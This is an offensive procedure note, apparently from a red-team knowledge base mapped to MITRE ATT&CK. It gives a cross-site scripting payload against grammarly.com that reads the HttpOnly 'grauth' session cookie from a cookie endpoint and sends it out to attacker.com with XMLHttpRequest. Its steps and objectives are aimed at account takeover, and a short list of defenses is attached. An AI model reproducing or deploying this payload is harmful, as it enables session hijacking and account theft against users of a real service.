---
tags:
  - xss
  - cookie-theft
type: procedure
tools:
  - '[[tools/XMLHttpRequest]]'
tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 2fc25dd2-56a1-4bca-afc2-e79a746ae6c6
created_at: '2025-12-14T00:11:16.511Z'
updated_at: '2025-12-14T00:11:16.511Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Execute XSS Payload to Steal Session Cookies

## Summary

This procedure executes an injected XSS payload on www.grammarly.com to retrieve and exfiltrate HttpOnly-protected session cookies like grauth using XMLHttpRequest.

## Description

The payload (poc.js) runs in the context of grammarly.com due to the unsanitized gnar_containerId in a noscript tag, allowing it to bypass HttpOnly flags by querying the cookie endpoint and sending data to an attacker-controlled server. This enables session hijacking.

## Requirements

1. Victim must have visited the manipulated page
2. Access to the cookie endpoint with credentials
3. Attacker server to receive exfiltrated data

## Defense

Defensive measures and detection strategies:

- Sanitize cookie values before DOM insertion
- Restrict cross-origin requests to sensitive endpoints
- Monitor for anomalous XMLHttpRequests in browser logs

## Objectives

1. Retrieve grauth cookie value
2. Exfiltrate to attacker server
3. Prepare for account access

## Instructions

### Step 1: Deploy XSS Payload Script

**Context**: Host poc.js that performs the cookie retrieval and exfiltration.

Use [[tools/XMLHttpRequest]] in poc.js:

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://gnar.grammarly.com/cookies?name=grauth", true);
xhr.withCredentials = true;
xhr.onload = function() {
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET", "https://attacker.com/?cookie=" + encodeURIComponent(xhr.responseText), true);
    xhr2.send();
};
xhr.send();
```

> This fetches the cookie and sends it via GET to the attacker.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Credential Access]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques



## Commands Used



## Tools Used

- [[tools/XMLHttpRequest]]

## Tags

- [[xss]]
- [[cookie-theft]]
